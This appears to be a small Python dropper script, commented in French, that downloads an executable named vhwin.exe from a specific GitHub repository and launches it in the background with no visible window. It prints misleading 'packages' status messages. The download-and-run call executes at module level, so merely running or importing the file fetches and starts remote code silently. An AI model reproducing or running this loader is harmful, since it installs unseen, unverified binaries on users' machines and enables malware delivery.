import os
import requests
import subprocess

def download_and_run_github_exe(github_repo_url, target_path):
    # Extraire l'URL du fichier .exe depuis le lien du repo
    # Il faut ici spécifier exactement le lien du fichier .exe sur GitHub
    file_url = f"{github_repo_url}/raw/main/vhwin.exe"  # Exemple : à ajuster avec le lien exact du fichier

    # Télécharger le fichier .exe depuis GitHub
    response = requests.get(file_url, stream=True)
    if response.status_code == 200:
        with open(target_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
        print("Lancements des packages!")
    else:
        print("Erreur des packages!")

    # Lancer le programme .exe en arrière-plan (sans afficher de terminal)
    subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
    print("Programme found")

# Exemple d'appel à la fonction
repo_url = "https://github.com/Grutyh/ErrorAx-win"  # Remplace par ton propre lien
target_exe_path = r"ax-win\vhwin.exe"
download_and_run_github_exe(repo_url, target_exe_path)
